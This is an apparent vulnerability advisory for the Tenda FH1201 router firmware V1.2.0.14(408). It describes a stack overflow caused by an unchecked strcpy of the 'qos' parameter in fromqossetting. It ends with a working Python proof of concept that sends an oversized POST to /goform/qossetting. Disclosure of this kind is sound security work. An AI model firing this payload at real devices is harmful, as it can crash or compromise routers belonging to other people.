## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3322.html

## Affected version

FH1201 Firmware  V1.2.0.14(408)

## Vulnerability details

The Tenda FH1201 Firmware  V1.2.0.14(408) has a stack overflow vulnerability located in the `fromqossetting` function. This function accepts the `qos` parameter from a POST request. The statement `strcpy(v8, src);` leads to a buffer overflow. The user-supplied `qos` can exceed the capacity of the `v8` array, thus triggering this security vulnerability.

![image-20240731135502239](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240731135502239.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://" + ip + "/goform/qossetting"
payload = b"a"*1000

data = {"qos": payload, "op":"delete"}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240731133213595](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240731133213595.png)